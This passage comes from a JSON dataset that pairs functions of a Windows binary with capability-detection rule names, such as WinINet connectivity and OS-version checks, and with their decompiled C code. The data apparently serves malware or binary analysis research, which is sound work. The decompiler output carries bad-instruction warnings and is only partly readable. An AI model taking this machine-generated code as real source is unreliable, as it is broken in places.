0x5e11b;\n                            var_11ch = fcn.0005a640(var_114h, var_8h[1] + var_124h, \n                                                    (var_124h >> 0x1f) + CARRY4(var_8h[1], var_124h), \n                                                    &fcn.0005df30::var_110h, 0xf8);\n                            if (var_11ch == 0) {\n                                if (var_110h == 0x4550) {\n                                    fcn.000789b4(uVar1);\n                                    var_114h = 0;\n                                    if ((((*(var_8h + 2) == '\\0') || (var_e8h == 0)) ||\n                                        (var_11ch = fcn.0005b420(*var_8h, var_8h[1] + var_e8h, var_8h[1], 0), \n                                        var_11ch == 0)) && (var_11ch = fcn.000593d0(iVar2, var_8h[1]),  var_11ch == 0))\n                                    {\n                                        var_11ch = fcn.0005e260(*var_8h, &fcn.0005df30::var_110h, var_8h[1]);\n                                    }\n                                }\n                                else {\n                                    var_11ch = -1;\n                                }\n                            }\n                        }\n                        else {\n                            var_11ch = -1;\n                        }\n                    }\n                }\n                else {\n                    var_11ch = 0;\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_114h != 0) {\n        fcn.000789b4(var_114h);\n    }\n    var_8h[3] = var_11ch;\n    *in_FS_OFFSET = var_10h;\n    return;\n}\n",
        "token_count": 1044
    },
    "0005e260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005e2be)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005e260(uint param_1, int32_t param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    uint32_t var_10h;\n    int32_t var_14ch;\n    int32_t var_148h;\n    int32_t var_144h;\n    uint var_140h;\n    uint var_34h;\n    uint32_t var_28h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x800b8e00;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xfffffea4;\n    var_144h = 0;\n    var_148h = 0;\n    var_4h = 0;\n    var_20h = var_10h + *(var_ch + 0x80);\n    if (var_20h == var_10h) {\n        var_14ch = 0;\n        puStack28 = &stack0xfffffea4;\n    }\n    else {\n        var_14ch = fcn.0005a7d0(&var_148h, 0x18, var_8h);\n        if (var_14ch == 0) {\n            while (var_14ch = fcn.0005a640(var_148h, var_20h, 0, &var_34h, 0x14),  var_14ch == 0) {\n                if (var_28h == 0) {\n                    fcn.0005a790(var_148h, var_10h);\n                    var_14ch = 0;\n                    break;\n                }\n                var_14ch = fcn.0005a640(var_148h, var_10h + var_28h, CARRY4(var_10h, var_28h), &var_140h, 0x104);\n                if (var_14ch != 0) break;\n                if (var_140h != '\\0') {\n                    if (var_144h != 0) {\n                        var_14ch = 0x2159000d;\n                        break;\n                    }\n                    iVar1 = fcn.000594b0(var_8h, &var_140h, &var_1ch);\n                    if (iVar1 == 0) {\n                        fcn.00059c90(var_8h, var_1ch);\n                        fcn.0005de60(var_8h, var_1ch, 1);\n                    }\n                    var_20h = var_20h + 0x14;\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_148h != 0) {\n        fcn.000789b4(var_148h);\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_14ch;\n}\n",
        "token_count": 763
    },
    "0005e490": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0005e490(uint param_1, int32_t param_2, uint32_t param_3, uint32_t *param_4)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    uint32_t var_10h;\n    uint32_t *var_14h;\n    uint var_18h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t *var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d90;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffc0;\n    if (var_ch == 0) {\n        var_30h = 0x21590066;\n    }\n    else if (var_14h == NULL) {\n        var_30h = 0x21590068;\n    }\n    else {\n        iVar1 = fcn.000789a8(var_ch, 0x800557d8, 4);\n        if (iVar1 == 0) {\n            var_1ch = var_ch + 8;\n            iVar1 = fcn.0005ca40(var_8h, 0x800557e4, 0, &var_2ch, 0);\n            if (iVar1 == 0) {\n                var_30h = fcn.0005bf80(var_2ch, 0x80055808, 0, 0, &var_24h, 0);\n                if (var_30h == 0) {\n                    var_4h = 0;\n                    var_20h = 0;\n                    while ((var_20h < *(var_24h + 4) &&\n                           (iVar1 = fcn.000789a8(var_1ch, var_24h + *(var_24h + 8 + var_20h * 0xc), \n                                                 *(var_24h + 0xc + var_20h * 0xc) >> 1),  iVar1 != 0))) {\n                        var_20h = var_20h + 1;\n                    }\n                    if (var_20h < *(var_24h + 4)) {\n                        var_28h = var_24h + *(var_24h + 0x10 + var_20h * 0xc);\n                        if (*var_28h == 0) {\n                            *var_14h = 0xffffffff;\n                            var_30h = 0;\n                            var_4h = 0xffffffff;\n                        }\n                        else if (*var_14h < *var_28h) {\n                            if (var_10h < var_28h[*var_14h * 4 + 4] + 2) {\n                                var_30h = 0x2159000b;\n                                var_4h = 0xffffffff;\n                            }\n                            else {\n                                fcn.00078be8(var_ch, var_24h + var_28h[*var_14h * 4 + 3], var_28h[*var_14h * 4 + 4]);\n                                *(var_ch + (var_28h[*var_14h * 4 + 4] & 0xfffffffe)) = 0;\n                                if (*var_14h < *var_28h - 1) {\n                                    *var_14h = *var_14h + 1;\n                                }\n                                else {\n                                    *var_14h = 0xffffffff;\n                                }\n                                var_30h = 0;\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_30h = 0x2159000e;\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                    else {\n                        *var_14h = 0xffffffff;\n                        var_30h = 0;\n                        var_4h = 0xffffffff;\n                    }\n                }\n                fcn.000357f0(var_2ch);\n            }\n            else {\n                *var_14h = 0xffffffff;\n                var_30h = 0;\n            }\n        }\n        else {\n            *var_14h = 0xffffffff;\n            var_30h = 0;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_30h;\n}\n",
        "token_count": 1064
    },
    "0005f130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Switch with 1 destination removed at 0x0005f525\n// WARNING: Switch with 1 destination removed at 0x0005f611\n\nvoid __cdecl\nfcn.0005f130(int32_t arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint32_t arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint uVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_3h;\n    \n    fcn.00060d60(arg_8h);\n    cVar1 = *(arg_8h + 0x112 + *(arg_8h + 4)) >> 6;\n    uVar2 = *(arg_8h + 0x112 + *(arg_8h + 4)) & 7;\n    uVar3 = (*(arg_8h + 0x101) & 1) << 3 | uVar2;\n    uVar4 = fcn.0005e710(arg_8h, arg_10h);\n    *(arg_ch + 1) = uVar4;\n    if (cVar1 == '\\x03') {\n        *arg_ch = 0x8c;\n        if (arg_14h == 1) {\n            uVar5 = fcn.0005edf0(arg_8h, *(arg_ch + 1));\n            arg_ch[4] = uVar5;\n        }\n        else {\n            uVar5 = fcn.0005efc0(arg_8h, arg_14h);\n            arg_ch[4] = uVar5;\n        }\n    }\n    else {\n        *arg_ch = 0x8d;\n        if (*(arg_8h + 0x10c) == '@') {\n            arg_ch[4] = uVar3 + 0x35;\n            if (cVar1 == '\\x01') {\n                *(arg_ch + 6) = 8;\n            }\n            else if (cVar1 == '\\x02') {\n                *(arg_ch + 6) = 0x20;\n            }\n            else if ((cVar1 == '\\0') && (uVar3 == 5)) {\n                arg_ch[4] = 0x8b;\n                *(arg_ch + 6) = 0x20;\n            }\n            else {\n                *(arg_ch + 6) = 0;\n            }\n            if (uVar2 == 4) {\n                fcn.00060d60(arg_8h);\n                *(arg_ch + 0x19) = 1 << (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 6) & 0xfe;\n                arg_ch[5] = (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 3 & 7U | ((*(arg_8h + 0x101) & 3) >> 1) << 3) + 0x35;\n                arg_ch[4] = (*(arg_8h + 0x112 + *(arg_8h + 4)) & 7 | (*(arg_8h + 0x101) & 1) << 3) + 0x35;\n                if (arg_ch[5] == 0x39) {\n                    arg_ch[5] = 0;\n                    *(arg_ch + 0x19) = 0;\n                }\n                if ((arg_ch[4] == 0x3a) || (arg_ch[4] == 0x42)) {\n                    if (cVar1 == '\\0') {\n                        arg_ch[4] = 0;\n                    }\n                    if (cVar1 == '\\x01') {\n                        *(arg_ch + 6) = 8;\n                    }\n                    else {\n                        *(arg_ch + 6) = 0x20;\n                    }\n                }\n            }\n        }\n        else if (*(arg_8h + 0x10c) == ' ') {\n            arg_ch[4] = uVar3 + 0x25;\n            if (cVar1 == '\\x01') {\n                *(arg_ch + 6) = 8;\n            }\n            else if (cVar1 == '\\x02') {\n                *(arg_ch + 6) = 0x20;\n            }\n            else if ((cVar1 == '\\0') && (uVar3 == 5)) {\n                arg_ch[4] = 0;\n                *(arg_ch + 6) = 0x20;\n            }\n            else {\n                *(arg_ch + 6) = 0;\n            }\n            if (uVar2 == 4) {\n                fcn.00060d60(arg_8h);\n                *(arg_ch + 0x19) = 1 << (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 6) & 0xfe;\n                arg_ch[5] = (*(arg_8h + 0x112 + *(arg_8h + 4)) >> 3 & 7U | ((*(arg_8h + 0x101) & 3) >> 1) << 3) + 0x25;\n                arg_ch[4] = (*(arg_8h + 0x112 + *(arg_8h + 4)) & 7 | (*(arg_8h + 0x101) & 1) << 3) + 0x25;\n                if (arg_ch[5] == 0x29) {\n                    arg_ch[5] = 0;\n                    *(arg_ch + 0x19) = 0;\n                }\n                if (arg_ch[4] == 0x2a) {\n                    if (cVar1 == '\\0') {\n                        arg_ch[4] = 0;\n                    }\n                    if (cVar1 == '\\x01') {\n                        *(arg_ch + 6) = 8;\n                    }\n                    else {\n                        *(arg_ch + 6) = 0x20;\n                    }\n                }\n            }\n        }\n        else {\n            if (uVar3 < 8) {\n                return;\n            }\n            if ((cVar1 == '\\0') && (uVar3 == 6)) {\n                *(arg_ch + 6) = 0x10;\n            }\n            else if (cVar1 == '\\x01') {\n                *(arg_ch + 6) = 8;\n            }\n            else if (cVar1 == '\\x02') {\n                *(arg_ch + 6) = 0x10;\n            }\n        }\n    }\n    if (*(arg_ch + 6) - 8 < 0x39) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (arg_18h != NULL) {\n        *arg_18h = 0x8c;\n        uVar4 = fcn.0005e710(arg_8h, arg_1ch & 0xff);\n        *(arg_18h + 1) = uVar4;\n        if (arg_20h == 1) {\n            uVar5 = fcn.0005edf0(arg_8h, *(arg_18h + 1));\n            arg_18h[4] = uVar5;\n        }\n        else {\n            uVar5 = fcn.0005efc0(arg_8h, arg_20h);\n            arg_18h[4] = uVar5;\n        }\n    }\n    return;\n}\n",
        "token_count": 1718
    },
    "000604d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x000605a4\n\nuchar __cdecl fcn.000604d0(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uchar uVar3;\n    uint uVar4;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    *(arg_8h + 0xc) = 0;\n    fcn.000603e0(arg_8h);\n    fcn.00060d60(arg_8h);\n    var_ch = 0;\n    bVar2 = false;\n    do {\n        if (bVar2) {\ncode_r0x000606e0:\n            fcn.00060e30(arg_8h);\n            fcn.00061ad0(arg_8h);\n            if (*(arg_8h + 0x8c) == '@') {\n                *(arg_8h + 0x101) = *(arg_8h + 0x101) & (*(*(arg_8h + 0x98) + 0x1c) >> 0x10 & 0xf | 0x40);\n                *(arg_8h + 0x10a) = *(*(arg_8h + 0x98) + 0x1c) & 8;\n                *(arg_8h + 0x100) = *(*(arg_8h + 0x98) + 0x1c) & 0x10;\n                if (((*(*(arg_8h + 0x98) + 0x1c) & 0xff0000) == 0) || ((*(arg_8h + 0x101) & 0xf) >> 3 == 0)) {\n                    if (*(arg_8h + 0x103) == '\\0') {\n                        *(arg_8h + 0x10b) = (-(*(arg_8h + 0x10a) != '\\0') & 0x20U) + 0x20;\n                    }\n                    else {\n                        *(arg_8h + 0x10b) = 0x10;\n                    }\n                }\n                else {\n                    *(arg_8h + 0x10b) = 0x40;\n                }\n                *(arg_8h + 0x10c) = (-(*(arg_8h + 0x104) != '\\0') & 0xe0U) + 0x40;\n            }\n            else if (*(arg_8h + 0x8c) == ' ') {\n                *(arg_8h + 0x10b) = (-(*(arg_8h + 0x103) != '\\0') & 0xf0U) + 0x20;\n                *(arg_8h + 0x10c) = (-(*(arg_8h + 0x104) != '\\0') & 0xf0U) + 0x20;\n            }\n            else if (*(arg_8h + 0x8c) == '\\x10') {\n                *(arg_8h + 0x10b) = (-(*(arg_8h + 0x103) != '\\0') & 0x10U) + 0x10;\n                *(arg_8h + 0x10c) = (-(*(arg_8h + 0x104) != '\\0') & 0x10U) + 0x10;\n            }\n            if (((*(*(arg_8h + 0x98) + 0x1c) & 4) == 0) && (*(arg_8h + 0x103) != '\\0')) {\n                *(arg_8h + 0x100) = 1;\n            }\n            if (((*(*(arg_8h + 0x98) + 0x1c) & 1) == 0) && (*(arg_8h + 0x104) != '\\0')) {\n                *(arg_8h + 0x100) = 1;\n            }\n            *(arg_8h + 0x10f) = (*(*(arg_8h + 0x98) + 0x1c) & 0x20) != 0;\n            *(arg_8h + 0x110) = (*(*(arg_8h + 0x98) + 0x1c) & 0x40) != 0;\n            *(arg_8h + 0x111) = (*(*(arg_8h + 0x98) + 0x1c) & 0x80) != 0;\n            fcn.0005f7e0(arg_8h);\n            if ((*(*(arg_8h + 0x98) + 0x1c) & 0x100) != 0) {\n                uVar4 = fcn.0005e7e0(arg_8h);\n                *(arg_8h + 0x9c) = uVar4;\n            }\n            *(arg_8h + 0x10d) = 0;\n            *(arg_8h + 0x10e) = 0;\n            if ((*(arg_8h + 0x9c) == 0x18) || (*(arg_8h + 0x9c) == 0xde)) {\n                if (*(arg_8h + 0xa4) == '\\x04') {\n                    *(arg_8h + 0xa4) = 0x10;\n                    *(arg_8h + 0x10d) = 1;\n                    *(arg_8h + 0x10e) = 0;\n                }\n                else if (*(arg_8h + 0xa4) == '\\x05') {\n                    *(arg_8h + 0xa4) = 0x20;\n                    *(arg_8h + 0x10d) = 1;\n                    *(arg_8h + 0x10e) = 0;\n                }\n                else {\n                    *(arg_8h + 0x10d) = 0;\n                    *(arg_8h + 0x10e) = 1;\n                }\n            }\n            else if (*(arg_8h + 0x9c) == 0x220) {\n                uVar4 = fcn.000611e0(arg_8h & 0xffffff00 | *(arg_8h + 0x112 + *(arg_8h + 4)));\n                *(arg_8h + 0x9c) = uVar4;\n            }\n            if (*(arg_8h + 0x100) != '\\0') {\n                fcn.000603e0(arg_8h);\n                *(arg_8h + 4) = *(arg_8h + 4) - *(arg_8h + 0xc);\n                *(arg_8h + 0xc) = 0;\n                uVar3 = fcn.00060e90(arg_8h);\n                *(arg_8h + 0xa8) = uVar3;\n                if (*(arg_8h + 0xa8) == 'f') {\n                    *(arg_8h + 0x9c) = 0x218;\n                }\n                else if (*(arg_8h + 0xa8) == 'g') {\n                    *(arg_8h + 0x9c) = 0x217;\n                }\n                else {\n                    *(arg_8h + 0x9c) = 0x221;\n                    *(arg_8h + 0xa0) = 0x8f;\n                    *(arg_8h + 0xa4) = 8;\n                }\n            }\n            *(arg_8h + 0x20) = *(arg_8h + 0x90);\n            *(arg_8h + 0x24) = *(arg_8h + 0x94);\n            *(arg_8h + 0x88) = 0;\n            var_8h = arg_8h + 0x212;\n            var_10h = arg_8h + 0x28;\n            for (var_ch = 0; var_ch < *(arg_8h + 0xc); var_ch = var_ch + 1) {\n                fcn.00078ad4(var_10h, 0x80055810, *var_8h);\n                var_10h = var_10h + 2;\n                var_8h = var_8h + 1;\n            }\n            uVar1 = *(arg_8h + 0x90);\n            *(arg_8h + 0x90) = *(arg_8h + 0xc) + *(arg_8h + 0x90);\n            *(arg_8h + 0x94) = *(arg_8h + 0x94) + CARRY4(*(arg_8h + 0xc), uVar1);\n            return *(arg_8h + 0xc);\n        }\n        if ((*(arg_8h + 0x112 + *(arg_8h + 4)) & 0xf0) == 0x40) {\n            if (*(arg_8h + 0x8c) == '@') {\n                *(arg_8h + 0x101) = *(arg_8h + 0x112 + *(arg_8h + 4));\n                fcn.00060d60(arg_8h);\n            }\n            else {\n                bVar2 = true;\n            }\n        }\n        else {\n            if (*(arg_8h + 0x112 + *(arg_8h + 4)) - 0x26 < 0xce) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            bVar2 = true;\n        }\n        if (0xe < var_ch) {\n            *(arg_8h + 0x100) = 1;\n            goto code_r0x000606e0;\n        }\n        var_ch = var_ch + 1;\n    } while( true );\n}\n",
        "token_count": 2276
    },
    "000610e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000610e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00060d20(arg_8h);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x28) = 0;\n        *(arg_8h + 0x48) = 0;\n        iVar1 = fcn.000604d0(arg_8h);\n        if (iVar1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            if (*(arg_8h + 0x1c) != 0) {\n                (**(arg_8h + 0x1c))(arg_8h);\n            }\n            uVar2 = fcn.000611d0(arg_8h);\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 212
    },
    "000615b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000615b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00060d60(arg_8h);\n    if (*(arg_8h + 0x109) == 'f') {\n        *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x7ff40b48;\n        if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n            *(arg_8h + 0x103) = 0;\n        }\n    }\n    else if (*(arg_8h + 0x109) == -0xe) {\n        *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x7ff3eb48;\n        if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n            *(arg_8h + 0x108) = 0;\n        }\n    }\n    else if (((*(arg_8h + 0x109) == -0xd) &&\n             (*(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x7ff42b48,  *(arg_8h + 0x98) != 0)) &&\n            (**(arg_8h + 0x98) != 0x244)) {\n        *(arg_8h + 0x106) = 0;\n    }\n    if ((*(arg_8h + 0x98) == 0) || (**(arg_8h + 0x98) == 0x244)) {\n        *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x7ff44b48;\n    }\n    if (**(arg_8h + 0x98) == 0x220) {\n        *(arg_8h + 0x98) = 0x800caa18;\n    }\n    if (**(arg_8h + 0x98) == 0x216) {\n        iVar1 = *(*(arg_8h + 0x98) + 0x1c);\n        if ((*(arg_8h + 0x109) == 'f') && (*(iVar1 * 0x10 + -0x7ff3a0e4) != 0)) {\n            uVar4 = fcn.00060e60(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x7ff3a0e4);\n            if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n                *(arg_8h + 0x103) = 0;\n                return;\n            }\n        }\n        else if ((*(arg_8h + 0x109) == -0xe) && (*(iVar1 * 0x10 + -0x7ff3a0e0) != 0)) {\n            uVar4 = fcn.00060e60(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x7ff3a0e0);\n            if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n                *(arg_8h + 0x108) = 0;\n                return;\n            }\n        }\n        else if ((*(arg_8h + 0x109) == -0xd) && (*(iVar1 * 0x10 + -0x7ff3a0dc) != 0)) {\n            uVar4 = fcn.00060e60(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x7ff3a0dc);\n            if ((*(arg_8h + 0x98) != 0) && (**(arg_8h + 0x98) != 0x244)) {\n                *(arg_8h + 0x106) = 0;\n                return;\n            }\n        }\n        if ((*(arg_8h + 0x109) == '\\0') || (**(arg_8h + 0x98) == 0x216)) {\n            uVar4 = fcn.00060e60(arg_8h);\n            *(arg_8h + 0x98) = ((uVar4 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x7ff3a0e8);\n        }\n        if (*(arg_8h + 0x112 + *(arg_8h + 4)) == '\\x01') {\n            uVar4 = fcn.00060e60(arg_8h);\n            uVar5 = (uVar4 & 0xff) >> 3 & 7;\n            uVar4 = fcn.00060e60(arg_8h);\n            cVar2 = (uVar4 & 0xff) >> 6;\n            uVar3 = fcn.00060e60(arg_8h);\n            if ((uVar5 == 3) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = (uVar3 & 7) * 0x20 + -0x7ff3b948;\n                fcn.00060d60(arg_8h);\n            }\n            else if ((uVar5 == 7) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = (uVar3 & 7) * 0x20 + -0x7ff3ba48;\n                fcn.00060d60(arg_8h);\n            }\n            else {\n                *(arg_8h + 0x98) = uVar5 * 0x20 + -0x7ff3bb48;\n            }\n        }\n        else if (*(arg_8h + 0x112 + *(arg_8h + 4)) == -0x52) {\n            uVar4 = fcn.00060e60(arg_8h);\n            uVar3 = (uVar4 & 0xff) >> 3 & 7;\n            uVar4 = fcn.00060e60(arg_8h);\n            cVar2 = (uVar4 & 0xff) >> 6;\n            if ((uVar3 == 5) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = 0x800c5cb8;\n                fcn.00060d60(arg_8h);\n            }\n            else if ((uVar3 == 6) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = 0x800c5cd8;\n                fcn.00060d60(arg_8h);\n            }\n            else if ((uVar3 == 7) && (cVar2 == '\\x03')) {\n                *(arg_8h + 0x98) = 0x800c5cf8;\n                fcn.00060d60(arg_8h);\n            }\n            else {\n                *(arg_8h + 0x98) = uVar3 * 0x20 + -0x7ff3a748;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1907
    },
    "00061b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.00061b60(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800da9c4 == 0) {\n        iVar1 = 0x21590064;\n    }\n    else {\n        iVar1 = fcn.0001d840(param_1);\n        if (iVar1 == 0) {\n            *0x800da9a4 = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 129
    },
    "00061ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00061ba0(void)\n\n{\n    if (*0x800da9a4 != 0) {\n        fcn.00061e80();\n        *0x800da9a4 = 0;\n    }\n    return;\n}\n",
        "token_count": 55
    },
    "00061bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061bc0(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800da9a4 == 0) {\n        iVar1 = 0x21590001;\n    }\n    else {\n        iVar1 = fcn.00061df0(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            *(*arg_ch + 0x70) = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 126
    },
    "00061c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061c00(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800da9a4 == 0) {\n        iVar1 = 0x21590001;\n    }\n    else {\n        iVar1 = fcn.00061d60(arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            *(*arg_ch + 0x70) = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 126
    },
    "00061d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061d60(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00062110(*0x800da9e8, arg_8h, &var_8h);\n    if ((var_4h == 0) &&\n       (var_4h = fcn.00062b00((*(*0x800da9a8 + var_8h * 4) - *0x800da9e8) + *0x800da9ac, *0x800da9e8 - *0x800da9ac, 6, 0\n                              , arg_ch),  var_4h == 0)) {\n        *(*arg_ch + 8) = *(*0x800da9a8 + var_8h * 4);\n    }\n    return var_4h;\n}\n",
        "token_count": 227
    },
    "00061df0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00061df0(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0005cd70(*0x800da9e8, arg_8h, &var_8h);\n    if (((var_4h == 0) && (var_4h = fcn.0005cd70(*0x800da9ac, arg_8h, &var_ch),  var_4h == 0)) &&\n       (var_4h = fcn.00062b00(var_ch, *0x800da9e8 - *0x800da9ac, 6, 0, arg_ch),  var_4h == 0)) {\n        *(*arg_ch + 8) = var_8h;\n    }\n    return var_4h;\n}\n",
        "token_count": 218
    },
    "00061f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
